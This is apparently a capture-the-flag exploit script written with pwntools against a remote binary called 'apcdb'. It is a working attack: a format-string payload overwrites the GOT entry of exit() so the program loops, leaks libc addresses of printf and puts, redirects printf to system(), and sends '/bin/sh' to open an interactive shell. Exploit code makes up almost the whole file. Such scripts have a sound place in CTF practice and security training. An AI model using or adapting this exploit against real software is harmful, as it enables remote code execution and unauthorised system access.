from pwn import *
context.log_level='debug'

#This is purely a format string challenge, hence the canary is not important
#1) redirecting code execution by overwriting exit() with main() so that the program loops to allow multiple inputs
#2) when you use the format string %s it will read the address you overwrite, use that to leak libc
#3) overwrite printfgot with system
#4) call printf with "/bin/sh" by entering the string into the

### DECLARE ###
BINARY = "./apcdb"
URL = "challs.8059blank.ml"
PORT = 1018
FMT_OFFSET = 6
PROMPT = "[+] Contact Lookup: "

### Overwriting exit() ###
elf = context.binary = ELF(BINARY)
rop = ROP(BINARY)
p = remote(URL, PORT)

payload1 = flat(
	fmtstr_payload(FMT_OFFSET, {elf.got['exit']:elf.symbols['main']})
)

p.recvuntil(PROMPT)
p.sendline(payload1)

### Leak libc ###
read_offset = FMT_OFFSET +1
payload2 = flat(
	"%"+str(read_offset)+"$s"
	"AAAA",
	elf.got['printf']
)

p.recvuntil(PROMPT)
p.sendline(payload2)

p.recvuntil("for ")
printf_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00")) # standard
log.info("libc printf is: " + hex(printf_libc))

### libc confirmation ###
payload2b = flat(
	"%7$sAAAA",
	elf.got['puts']
)

p.recvuntil(PROMPT)
p.sendline(payload2b)

p.recvuntil("for ")
puts_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00")) # standard
log.info("libc puts is: " + hex(puts_libc))

### DECLARE ###
libc = ELF('./libc6_2.27-3ubuntu1.5_amd64.so')

libc_base = printf_libc - libc.symbols['printf']
log.info("libc base is: " + hex(libc_base))

### set printf as system() ###
libc_system = libc_base + libc.symbols['system']
log.info("libc_system is " + hex(libc_system))

payload2 = flat(
	fmtstr_payload(FMT_OFFSET, {elf.got['printf']:libc_system})
)

p.recvuntil(PROMPT)
p.sendline(payload2)

### call shell ###
payload3 = "/bin/sh\x00"

#p.recvuntil(PROMPT)
p.sendline(payload3)

p.interactive()

